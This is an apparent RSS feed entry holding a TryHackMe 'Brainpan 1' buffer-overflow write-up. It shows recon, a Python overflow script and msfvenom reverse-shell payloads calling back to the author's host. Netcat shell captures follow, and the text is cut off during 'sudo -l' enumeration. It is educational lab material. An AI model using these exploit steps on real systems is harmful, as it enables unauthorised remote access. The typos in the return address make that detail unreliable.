@@ -1,0 +1,627 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Buffer Overflow on 0000FF</title><link>https://simonefelici.github.io/tags/buffer-overflow/</link><description>Recent content in Buffer Overflow on 0000FF</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 04 Jan 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://simonefelici.github.io/tags/buffer-overflow/index.xml" rel="self" type="application/rss+xml"/><item><title>Brainpan 1 Writeup THM</title><link>https://simonefelici.github.io/p/brainpan-1-writeup-thm/</link><pubDate>Thu, 04 Jan 2024 00:00:00 +0000</pubDate><guid>https://simonefelici.github.io/p/brainpan-1-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled.png" alt="Featured image of post Brainpan 1 Writeup THM" />&lt;p>I am going to start with a nmap scan:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 10.10.143.30
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-03 12:34 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.143.30
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.058s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">998&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">9999/tcp open abyss
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10000/tcp open snet-sensor-mgmt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 7.40 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">9999/tcp open abyss?
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10000/tcp open http SimpleHTTPServer 0.6 &lt;span class="o">(&lt;/span>Python 2.7.3&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Port 9999 contains the program:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 10.10.143.30 &lt;span class="m">9999&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> _&lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> _&lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>________________________ WELCOME TO BRAINPAN _________________________&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ENTER THE PASSWORD
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And 10000 contains a http server:&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>The site doesn’t tell us much, but I used ffuf for enumerating the subdirectories:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.143.30:10000/FUZZ -w /usr/share/wordlists/dirb/big.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.143.30:10000/FUZZ
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin &lt;span class="o">[&lt;/span>Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 65ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>He found the bin directory, which contains the exe!&lt;/p>
+&lt;p>I moved the exe in my windows machine with Immunity Debugger and mona installed.&lt;/p>
+&lt;p>And I started the server:&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled%201.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>I will use this code for getting a reverse shell:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">import socket
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;10.10.6.37&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">9999&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">overflow&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span> * offset
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">retn&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">padding&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;\x90&amp;#34;&lt;/span> * &lt;span class="m">16&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">postfix&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">buffer&lt;/span> &lt;span class="o">=&lt;/span> overflow + retn + padding + payload + postfix
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">s&lt;/span> &lt;span class="o">=&lt;/span> socket.socket&lt;span class="o">(&lt;/span>socket.AF_INET, socket.SOCK_STREAM&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">try:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> s.connect&lt;span class="o">((&lt;/span>ip, port&lt;span class="o">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> print&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;Sending evil buffer...&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> s.send&lt;span class="o">(&lt;/span>bytes&lt;span class="o">(&lt;/span>buffer + &lt;span class="s2">&amp;#34;\r\n&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;latin-1&amp;#34;&lt;/span>&lt;span class="o">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> print&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;Done!&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">except:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> print&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;Could not connect.&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>With 600 bytes the server crushes.&lt;/p>
+&lt;p>So I am going to use metasploit to create a payload:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l &lt;span class="m">5000&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And I got the offset using mona:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">!mona findmsp -distance &lt;span class="m">5000&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled%202.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>Now I can put the offset in the offset variable inside the script.&lt;/p>
+&lt;p>I am going to start searching for the bad characters:&lt;/p>
+&lt;p>Using a payload with all the characters and compare it with mona we get this:&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled%203.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>After that we search for the jmp:&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled%204.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>We need to put this in the retn variable of the script: \zf3\x12\x17\x31 (It is reversed because of the little eldiana rchitecture, which x86 CPUs have.)&lt;/p>
+&lt;p>Then we generate our payload:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfvenom -p windows/shell_reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>10.18.20.116 &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">4444&lt;/span> &lt;span class="nv">EXITFUNC&lt;/span>&lt;span class="o">=&lt;/span>thread -b &lt;span class="s2">&amp;#34;\x00\x01\x02\x03\x04\x06\x07&amp;#34;&lt;/span> -f c
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And put it in the code.&lt;/p>
+&lt;p>And now if we run the code we should have a shell:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4444&lt;/span> ...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.18.20.116&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.6.37&lt;span class="o">]&lt;/span> &lt;span class="m">49292&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Microsoft Windows &lt;span class="o">[&lt;/span>Version 6.1.7601&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Copyright &lt;span class="o">(&lt;/span>c&lt;span class="o">)&lt;/span> &lt;span class="m">2009&lt;/span> Microsoft Corporation. All rights reserved.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\a&lt;/span>dmin&lt;span class="se">\D&lt;/span>esktop&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Now I am just going to change the ip of the script and put the one of the machine, and we should have a shell in the remote server:&lt;/p>
+&lt;ul>
+&lt;li>note, i have used another msfvenom payload for this one:&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfvenom -p linux/x86/shell_reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>10.18.20.116 &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">4444&lt;/span> &lt;span class="nv">EXITFUNC&lt;/span>&lt;span class="o">=&lt;/span>thread -b &lt;span class="s2">&amp;#34;\x00\x01\x02\x03\x04\x06\x07&amp;#34;&lt;/span> -f c
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4555&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4555&lt;/span> ...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.18.20.116&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.143.30&lt;span class="o">]&lt;/span> &lt;span class="m">41139&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checksrv.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">web
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python -c &lt;span class="s1">&amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">puck@brainpan:/home/puck$ sudo -l
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo -l
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching Defaults entries &lt;span class="k">for&lt;/span> puck on this host:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> env_reset, mail_badpass,
